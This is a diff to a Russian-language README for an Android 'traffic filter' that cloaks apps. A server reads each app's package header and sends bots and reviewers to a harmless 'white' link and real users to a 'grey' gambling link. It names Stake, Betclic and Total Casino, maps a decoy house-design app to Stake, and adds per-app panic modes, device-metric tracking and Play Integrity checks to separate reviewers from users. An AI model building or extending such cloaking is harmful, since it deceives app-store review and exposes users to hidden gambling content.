@@ -1,4 +1,4 @@
-# APK Traffic Filter v2.0
+# APK Traffic Filter v2.1
 
 **Система фильтрации трафика для Android-приложений**
 
@@ -48,6 +48,78 @@
 |-- js-scripts/      # JS-трекер (собирает метрики с устройства)
 |-- cf-worker/       # Cloudflare Worker (edge-фильтрация)
 ```
+
+---
+
+## Мульти-приложения
+
+Система поддерживает несколько приложений одновременно. Каждое приложение — отдельная сущность со своими настройками.
+
+### Как работает привязка
+
+APK автоматически отправляет заголовок `X-Package-Name` (SDK берёт из `AndroidManifest.xml`). Сервер по этому заголовку определяет какое приложение стучится и использует его настройки:
+
+```
+APK шлёт: X-Package-Name: com.CamNangXayNha.ThietKeNhaO
+                    ↓
+Сервер ищет в apps.json → находит "Stake"
+                    ↓
+Использует Stake URLs, cert SHA-256, GCP-ключ, panic mode
+```
+
+### Что хранится для каждого приложения
+
+| Поле | Описание |
+|------|----------|
+| `name` | Название (Betclic Sports, Stake, ...) |
+| `package_name` | Package из AndroidManifest (com.example.app) |
+| `cert_sha256` | SHA-256 сертификата подписи (base64) |
+| `gcp_project_id` | ID GCP-проекта для Play Integrity |
+| `safe_url` | Белая ссылка (куда слать ботов) |
+| `target_url` | Серая ссылка (куда слать юзеров) |
+| `white_flow_type` | Тип белого потока (redirect/403/404/html) |
+| `panic_mode` | Panic mode для этого приложения |
+
+### Как добавить новое приложение
+
+1. **Через панель:** Приложения → Добавить → заполнить поля → Сохранить
+2. **GCP-ключ:** положить `gcp-key-appN.json` в `server/config/` → перезапустить сервер
+3. **В APK:** прогер указывает `serverUrl = "https://api.threeamigosteam.com/engine"` (с `/engine`!)
+
+SDK автоматически подставит `X-Package-Name` из AndroidManifest. Сервер автоматически загрузит все GCP-ключи из `config/gcp-key*.json`.
+
+### API приложений
+
+| Метод | Путь | Описание |
+|-------|------|----------|
+| `GET` | `/api/apps` | Список всех приложений |
+| `POST` | `/api/apps` | Добавить приложение |
+| `PUT` | `/api/apps/{id}` | Обновить приложение |
+| `DELETE` | `/api/apps/{id}` | Удалить приложение |
+| `PUT` | `/api/apps/{id}/panic` | Вкл/выкл panic mode |
+
+### Мульти-GCP ключи
+
+Каждое приложение может иметь свой GCP-проект для Play Integrity:
+
+```
+server/config/
+  gcp-key.json          → betclic-497407     (Betclic Sports)
+  gcp-key-app2.json     → stake-497708       (Stake)
+  gcp-key-app3.json     → total-casino-497709 (Total Casino)
+```
+
+Сервер при старте автоматически загружает ВСЕ `gcp-key*.json` файлы. Приложение привязывается к ключу через `gcp_project_id` в настройках.
+
+### SHA-256 сертификата
+
+Play Console → Целостность → Сертификат ключа подписи → SHA-256. Формат HEX с двоеточиями, нужно перевести в base64:
+
+```bash
+echo "E9:D0:ED:C5:1A:7F:..." | tr -d ':' | xxd -r -p | base64
+```
+
+**Важно:** если включён Google Play App Signing — нужен SHA-256 от **ключа подписи Google** (не upload key). Это тот сертификат который будет у юзеров из Play Store.
 
 ---
 
@@ -361,10 +433,11 @@ npm run build    # генерит tracker.min.js из tracker.js
 
 ```
 1. APK -> GET /                          # Gateway: проверка заголовков + IP
-           Headers: X-Client-Secret, X-Device-Model, X-Device-Codename,
-                    X-GPU-Renderer, X-Build-Product, User-Agent
+           Headers: X-Client-Secret, X-Package-Name, X-Device-Model,
+                    X-Device-Codename, X-GPU-Renderer, X-Build-Product, User-Agent
    
    Ответ: 302 redirect на targetUrl (серый) или safeUrl (белый)
+   Сервер определяет приложение по X-Package-Name → использует его URLs
 
 2. APK -> GET /api/integrity/nonce       # Получить одноразовый nonce
    Ответ: { "nonce": "abc123...", "ttl": 300 }
@@ -372,6 +445,7 @@ npm run build    # генерит tracker.min.js из tracker.js
 3. APK -> вызывает Google Play Integrity API с nonce
 
 4. APK -> POST /api/integrity/verify     # Отправить integrity token
+           Headers: X-Package-Name
            Body: { "integrityToken": "...", "nonce": "abc123..." }
    Ответ: { "verified": true, "verdict": "grey", "score": 0, ... }
 
@@ -404,8 +478,14 @@ npm run build    # генерит tracker.min.js из tracker.js
 | `GET` | `/api/audit/logs` | Аудит-лог с фильтрами |
 | `GET` | `/api/bans/honeypot` | Список забаненных IP |
 | `DELETE` | `/api/bans/honeypot/{ip}` | Разбанить IP |
+| `GET` | `/api/apps` | Список всех приложений |
+| `POST` | `/api/apps` | Добавить приложение |
+| `PUT` | `/api/apps/{id}` | Обновить приложение |
+| `DELETE` | `/api/apps/{id}` | Удалить приложение |
+| `PUT` | `/api/apps/{id}/panic` | Вкл/выкл panic mode для приложения |
+| `GET` | `/api/dashboard/traffic` | Трафик по часам (24ч) |
 | `PUT` | `/api/cf/sync` | Синхронизировать конфиг в Cloudflare KV |
-| `PUT` | `/api/cf/panic` | Включить/выключить panic mode |
+| `PUT` | `/api/cf/panic` | Включить/выключить panic mode (глобальный) |
 
 ---
 
@@ -654,4 +734,4 @@ npx wrangler deploy
 
 ---
 
-*v2.0.0 | Developed by maks*
+*v2.1.0 | Developed by maks*
